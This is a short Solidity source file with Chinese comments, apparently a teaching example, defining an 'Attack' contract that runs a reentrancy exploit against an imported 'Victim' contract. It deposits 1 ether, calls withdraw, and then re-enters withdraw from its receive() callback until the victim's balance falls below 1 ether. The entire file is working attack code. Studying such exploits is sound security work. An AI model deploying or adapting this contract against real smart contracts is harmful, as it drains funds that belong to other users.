// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "./Victim.sol";


contract Attack {
    Victim public victim; // 受害者合约地址

    // 初始化受害者合约地址
    constructor(Victim _victim) {
        victim = _victim;
    }

    // 回调函数，用于重入攻击合约，反复的调用目标的withdraw函数
    receive() external payable {
        if (victim.getBalance() >= 1 ether) {
            victim.withdraw();
        }
    }

    // 攻击函数，调用时 msg.value 设为 1 ether
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        victim.deposit{value: 1 ether}();
        victim.withdraw();
    }

    // 获取本合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}